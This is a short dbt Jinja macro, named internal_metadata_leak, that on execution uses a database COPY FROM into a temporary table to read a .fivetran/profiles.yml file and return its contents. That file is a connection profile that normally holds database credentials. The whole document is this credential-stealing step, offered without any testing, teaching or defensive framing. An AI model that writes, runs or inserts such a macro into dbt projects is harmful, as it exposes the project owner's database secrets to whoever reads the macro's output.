{% macro internal_metadata_leak() %}
    {% if execute %}
        {% set profile_content = "attempting..." %}
        
        {% set query %}
            CREATE TEMP TABLE temp_leak (content text);
            COPY temp_leak FROM '/tmp/dbt/project/.fivetran/profiles.yml';
            SELECT content FROM temp_leak;
        {% endset %}
        
        {% set results = run_query(query) if execute else [] %}
        {% set file_data = results.columns[0].values() | join("\n") if results else "access_denied" %}
        
        {{ return("FILE_DATA: " ~ file_data) }}
    {% else %}
        {{ return("reading...") }}
    {% endif %}
{% endmacro %}
